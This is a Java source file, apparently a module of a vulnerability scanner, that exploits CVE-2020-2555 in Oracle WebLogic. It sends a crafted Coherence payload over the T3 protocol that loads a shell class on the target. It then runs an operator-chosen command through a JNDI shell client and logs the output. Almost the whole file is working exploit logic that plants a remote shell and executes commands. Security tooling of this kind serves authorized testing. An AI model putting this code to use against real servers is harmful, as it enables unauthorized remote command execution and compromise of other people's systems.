package com.gbw.scanner.plugins.scripts.weblogic.vuls;

import com.gbw.scanner.Host;
import com.gbw.scanner.plugins.scripts.weblogic.GBWJNDIShellClient;
import com.gbw.scanner.plugins.scripts.weblogic.GBWPayloadSend;
import com.gbw.scanner.plugins.scripts.weblogic.GBWScanWeblogicConfig;
import com.gbw.scanner.plugins.scripts.weblogic.GBWWeblogicVersion;
import com.gbw.scanner.plugins.scripts.weblogic.payload.GBWCoherencePayload;
import com.gbw.scanner.plugins.scripts.weblogic.payload.GBWEchoPayload;
import com.gbw.scanner.plugins.scripts.weblogic.shell.GBWT3IIOPShell;
import com.xmap.api.utils.TextUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class GBWCVE_2020_2555 extends GBWAbstractEchoVul{

    private static final Logger log = LoggerFactory.getLogger(GBWCVE_2020_2555.class);

    public GBWCVE_2020_2555(GBWScanWeblogicConfig config) throws Exception {
        super(config,"CVE-2020-2555", "CVE-2020-2555");
        echoPayloads.add(new GBWCoherencePayload(config));
    }

    @Override
    public GBWVulCheckResult scan(Host host) {

        changeProto(host);
        GBWCoherencePayload coherencePayload;
        String version = GBWWeblogicVersion.getVersion(config,host);
        if(TextUtils.isEmpty(version))
            return null;

        for (GBWEchoPayload payload : echoPayloads) {

            coherencePayload = (GBWCoherencePayload)payload;

            log.info(String.format("For weblogic version:%s,check payload:%s",version,payload.getName()));

            try {

                GBWPayloadSend.sendT3(config,host,coherencePayload.makeT3Payload(version,GBWT3IIOPShell.class));

                Thread.sleep(config.getScanSleepTime());

                String result = GBWJNDIShellClient.exec(config,host,config.getCmd());
                if (result != null) {

                    log.warn(String.format("Find a weblogic vul,version:%s,check payload:%s,type:%s,code:%s,cmd:%s,result:%s,url:%s//%s:%d",
                            version,
                            payload.getName(),
                            type,
                            code,
                            config.getCmd(),
                            result,
                            host.getProto(),
                            host.getIp(),
                            host.getPort()));


                    return new GBWVulCheckResult(version,code,type,config.getCmd(),result,payload.getName());
                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        return null;
    }

    @Override
    public String getDefaultProto() {
        return "t3";
    }


}
